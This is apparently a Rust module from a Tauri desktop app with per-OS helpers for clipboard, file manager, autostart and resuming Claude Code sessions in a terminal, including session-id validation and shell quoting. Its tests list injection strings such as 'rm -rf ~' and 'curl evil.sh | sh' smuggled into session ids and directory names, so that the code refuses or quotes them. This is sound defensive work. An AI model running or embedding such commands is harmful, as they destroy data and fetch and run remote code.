//! The few things that genuinely differ per OS: clipboard, opening a folder,
//! launching a terminal, and autostart.

use std::io::Write;
use std::process::{Command, Stdio};

use anyhow::{anyhow, Result};
use tauri_plugin_autostart::ManagerExt;

/// Copy via the platform tool.
///
/// Shelling out rather than linking a clipboard crate keeps X11/Wayland system
/// libraries out of the Linux build for one feature.
pub fn copy_to_clipboard(_app: &tauri::AppHandle, text: &str) -> Result<()> {
    let candidates: Vec<(&str, Vec<&str>)> = if cfg!(target_os = "macos") {
        vec![("pbcopy", vec![])]
    } else if cfg!(target_os = "windows") {
        vec![("clip", vec![])]
    } else {
        vec![
            ("wl-copy", vec![]),
            ("xclip", vec!["-selection", "clipboard"]),
            ("xsel", vec!["--clipboard", "--input"]),
        ]
    };

    let mut tried = Vec::new();
    for (program, args) in candidates {
        tried.push(program);
        let spawned = Command::new(program)
            .args(&args)
            .stdin(Stdio::piped())
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .spawn();
        let Ok(mut child) = spawned else { continue };
        if let Some(stdin) = child.stdin.as_mut() {
            if stdin.write_all(text.as_bytes()).is_err() {
                continue;
            }
        }
        if child.wait().map(|s| s.success()).unwrap_or(false) {
            return Ok(());
        }
    }
    Err(anyhow!(
        "no working clipboard command (tried {})",
        tried.join(", ")
    ))
}

pub fn open_in_file_manager(path: &str) -> Result<()> {
    let program = if cfg!(target_os = "macos") {
        "open"
    } else if cfg!(target_os = "windows") {
        "explorer"
    } else {
        "xdg-open"
    };
    Command::new(program)
        .arg(path)
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .spawn()
        .map_err(|e| anyhow!("could not open {path}: {e}"))?;
    Ok(())
}

/// Session ids that are safe to place in a command line.
///
/// Claude Code writes uuids, but the value reaches us out of a JSON field and
/// out of directory names on disk — data, not a literal — and it ends up inside
/// a string that a shell will parse. Anything outside this alphabet is refused
/// rather than escaped, because there is no legitimate session id that needs a
/// semicolon.
fn is_safe_session_id(s: &str) -> bool {
    !s.is_empty()
        && s.len() <= 64
        && s.chars()
            .all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_')
}

/// Open a terminal running `claude --resume <session_id>` in the project dir.
///
/// The caller must have already established that the session's process is
/// dead; this function does not re-check.
///
/// Both arguments are treated as untrusted: the id is validated against a
/// strict alphabet and the working directory is quoted for whichever shell is
/// about to see it.
pub fn resume_in_terminal(session_id: &str, cwd: &str) -> Result<()> {
    if !is_safe_session_id(session_id) {
        return Err(anyhow!(
            "refusing to resume: session id contains unexpected characters"
        ));
    }

    #[cfg(target_os = "macos")]
    {
        let command = posix_command(session_id, cwd);
        // AppleScript is the only supported way to open a new Terminal window
        // running a command. Escape backslashes before quotes, or the escaping
        // of one would corrupt the other. The first run may prompt for
        // automation access.
        let script = format!(
            r#"tell application "Terminal" to do script "{}"
               tell application "Terminal" to activate"#,
            command.replace('\\', r"\\").replace('"', r#"\""#)
        );
        let ok = Command::new("osascript")
            .arg("-e")
            .arg(&script)
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .status()
            .map(|s| s.success())
            .unwrap_or(false);
        if ok {
            return Ok(());
        }
        return Err(anyhow!(
            "could not open Terminal automatically. Run this yourself:\n\n{command}"
        ));
    }

    #[cfg(target_os = "windows")]
    {
        // `cmd` has no quoting that survives `%`, `&`, `^`, `|`, `<` or `>`
        // reliably, so a path containing one is handed back to the user rather
        // than guessed at.
        if cwd.contains(['"', '%', '&', '^', '|', '<', '>']) {
            return Err(anyhow!(
                "cannot safely build a command for this path. Run this yourself:\n\n\
                 cd /d {cwd}\nclaude --resume {session_id}"
            ));
        }
        let command = format!("cd /d \"{cwd}\" && claude --resume {session_id}");
        let ok = Command::new("cmd")
            .args(["/C", "start", "", "cmd", "/K", &command])
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .status()
            .map(|s| s.success())
            .unwrap_or(false);
        if ok {
            return Ok(());
        }
        return Err(anyhow!(
            "could not open a terminal automatically. Run this yourself:\n\n{command}"
        ));
    }

    #[cfg(all(unix, not(target_os = "macos")))]
    {
        let command = posix_command(session_id, cwd);
        for (program, args) in [
            ("x-terminal-emulator", vec!["-e"]),
            ("gnome-terminal", vec!["--"]),
            ("konsole", vec!["-e"]),
            ("alacritty", vec!["-e"]),
            ("xterm", vec!["-e"]),
        ] {
            let ok = Command::new(program)
                .args(&args)
                .args(["sh", "-c", &command])
                .stdout(Stdio::null())
                .stderr(Stdio::null())
                .spawn()
                .is_ok();
            if ok {
                return Ok(());
            }
        }
        return Err(anyhow!(
            "could not open a terminal automatically. Run this yourself:\n\n{command}"
        ));
    }

    #[allow(unreachable_code)]
    Err(anyhow!(
        "resuming a session is not supported on this platform"
    ))
}

#[cfg(unix)]
fn posix_command(session_id: &str, cwd: &str) -> String {
    format!(
        "cd {} && claude --resume {}",
        shell_quote(cwd),
        shell_quote(session_id)
    )
}

/// POSIX single-quoting. Every byte inside single quotes is literal except the
/// single quote itself, which is closed, escaped, and reopened.
#[cfg_attr(not(unix), allow(dead_code))]
fn shell_quote(s: &str) -> String {
    if s.is_empty() {
        return "''".into();
    }
    if s.chars()
        .all(|c| c.is_ascii_alphanumeric() || "._-/@:+".contains(c))
    {
        return s.to_string();
    }
    format!("'{}'", s.replace('\'', r"'\''"))
}

pub fn autostart_enabled(app: &tauri::AppHandle) -> bool {
    app.autolaunch().is_enabled().unwrap_or(false)
}

/// Delegate to the autostart plugin rather than hand-rolling launchd,
/// systemd user units, and the Windows Run key.
pub fn set_autostart(app: &tauri::AppHandle, enabled: bool) -> Result<()> {
    let manager = app.autolaunch();
    let currently = manager.is_enabled().unwrap_or(false);
    if enabled == currently {
        return Ok(());
    }
    if enabled {
        manager.enable().map_err(|e| anyhow!("{e}"))?;
    } else {
        manager.disable().map_err(|e| anyhow!("{e}"))?;
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn shell_quote_leaves_plain_paths_alone() {
        assert_eq!(shell_quote("/Users/x/dev/repo"), "/Users/x/dev/repo");
    }

    #[test]
    fn shell_quote_wraps_spaces_and_escapes_quotes() {
        assert_eq!(shell_quote("/Users/x/My Repo"), "'/Users/x/My Repo'");
        assert_eq!(shell_quote("it's"), r"'it'\''s'");
        assert_eq!(shell_quote(""), "''");
    }

    #[test]
    fn real_session_ids_are_accepted() {
        assert!(is_safe_session_id("11111111-2222-3333-4444-555555555555"));
        assert!(is_safe_session_id("agent-a7d17883c2638dabb"));
        assert!(is_safe_session_id("wf_fc7f7bb0-e52"));
    }

    #[test]
    fn session_ids_carrying_shell_metacharacters_are_refused() {
        // The id arrives from a JSON field and from directory names on disk,
        // so it is attacker-influenced data, not a literal.
        for hostile in [
            "abc; rm -rf ~",
            "abc && curl evil.sh | sh",
            "abc$(whoami)",
            "abc`id`",
            "abc\nrm -rf ~",
            "abc\"; do shell script \"id",
            "abc|tee /tmp/x",
            "",
            &"a".repeat(65),
        ] {
            assert!(
                !is_safe_session_id(hostile),
                "should have been refused: {hostile:?}"
            );
            assert!(
                resume_in_terminal(hostile, "/tmp").is_err(),
                "resume must refuse: {hostile:?}"
            );
        }
    }

    #[cfg(unix)]
    #[test]
    fn a_hostile_working_directory_stays_one_argument() {
        // A directory really can be named this; it must end up as a single
        // quoted token rather than a second command.
        let cmd = posix_command("abc-123", "/tmp/x; rm -rf ~");
        assert!(cmd.contains("'/tmp/x; rm -rf ~'"), "{cmd}");
        assert!(!cmd.contains("&& rm"), "{cmd}");
    }

    #[cfg(unix)]
    #[test]
    fn the_built_command_is_the_expected_shape() {
        assert_eq!(
            posix_command("11111111-2222", "/Users/x/dev/repo"),
            "cd /Users/x/dev/repo && claude --resume 11111111-2222"
        );
    }
}
